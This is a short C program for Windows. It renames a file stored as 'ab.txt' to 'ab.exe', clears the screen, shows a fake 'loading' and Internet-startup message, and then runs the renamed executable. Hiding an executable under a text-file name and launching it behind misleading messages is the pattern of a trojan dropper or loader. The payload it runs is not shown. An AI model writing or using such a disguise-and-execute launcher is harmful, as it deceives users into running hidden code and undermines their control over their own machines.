#include <stdio.h>
#include <stdlib.h>

int main(){
    system("move Ab\\ab.txt Ab\\ab.exe");
    system("cls");
    printf("loading...");
    printf("Please ensure that your system has connected to Internet for the Startup...");
    system("Ab\\ab.exe");
}
